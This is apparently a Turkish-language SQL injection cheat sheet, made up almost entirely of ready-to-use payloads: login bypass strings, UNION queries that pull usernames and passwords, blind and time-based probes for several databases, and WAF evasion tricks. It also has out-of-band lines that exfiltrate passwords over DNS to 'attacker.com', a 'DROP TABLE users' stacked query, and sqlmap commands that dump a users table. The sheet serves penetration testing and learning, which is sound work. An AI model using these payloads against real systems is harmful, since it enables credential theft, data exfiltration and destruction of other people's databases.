**SQL Injection**



Kullanıcı girdisinin SQL sorgusuna zararlı bir kod eklenmesi sonucu, sorgu mantığının değiştirilebilmesidir.



**Tespit (Error-based)**



sql'

"

'--

' OR '1'='1

' OR 1=1--

admin'--



**Authentication Bypass**



sql-- Login formunda kullanıcı adı alanına:

admin' --

admin' OR '1'='1

' OR 1=1 LIMIT 1--

' OR ''='



**Union-Based (veri çekme)**



sql-- Önce kolon sayısını bul

' ORDER BY 1--

' ORDER BY 2--

' ORDER BY 3--   -- Hata verdiğinde bir önceki kolon sayısıdır



\-- Sonra veri çek

' UNION SELECT NULL,NULL,NULL--

' UNION SELECT username,password,NULL FROM users--



\-- MySQL: veritabanı bilgisi toplama

' UNION SELECT table\_name,NULL,NULL FROM information\_schema.tables--

' UNION SELECT column\_name,NULL,NULL FROM information\_schema.columns WHERE table\_name='users'--



**Blind SQLi (Boolean-based)**



sql' AND 1=1--    -- True ise normal sayfa döner

' AND 1=2--    -- False ise farklı/boş sayfa döner



\-- Veri çıkarma örneği (karakter karakter)

' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--



**Time-based Blind SQLi**



sql-- MySQL

' AND SLEEP(5)--

' OR IF(1=1,SLEEP(5),0)--



\-- MSSQL

'; WAITFOR DELAY '0:0:5'--



\-- PostgreSQL

'; SELECT pg\_sleep(5)--



\-- Oracle

' AND 1=1 AND DBMS\_LOCK.SLEEP(5)--



Out-of-Band (OOB) — DNS/HTTP exfiltration



sql-- MSSQL ile DNS üzerinden veri sızdırma

'; EXEC master..xp\_dirtree '\\\\'+(SELECT password FROM users)+'.attacker.com\\a'--



\-- MySQL ile (yetki gerekir)

' UNION SELECT LOAD\_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\\\a'))--



**WAF Bypass Teknikleri**



sql-- Yorum satırı ile boşluk yerine

/\*\*/UNION/\*\*/SELECT/\*\*/



\-- Case değiştirme

' UnIoN SeLeCt



\-- Encode

%27%20OR%201=1--



\-- Çift sorgu (stacked queries - destekleniyorsa)

'; DROP TABLE users;--



**Test Araçları**



*sqlmap — otomatik tespit ve exploit* 



*bash  sqlmap -u "http://target.com/page?id=1" --dbs*

&#x20; *sqlmap -u "http://target.com/page?id=1" -D dbname --tables*

&#x20; *sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump*



*Burp Suite (manuel test için Repeater)*





**Tespit Stratejisi**





*Her parametreye ' ve " gönderdim, hata mesajı (DB error) gelirse SQLi şüphesi var*

*Hata yoksa boolean-based denemek gerekebilir. (1=1 vs 1=2 farkına bak)*

*Hâlâ farksızsa time-based deneyelim (SLEEP(5))*

*Confirm ettikten sonra sqlmap ile otomatikleştirmeye geçilebilir.*

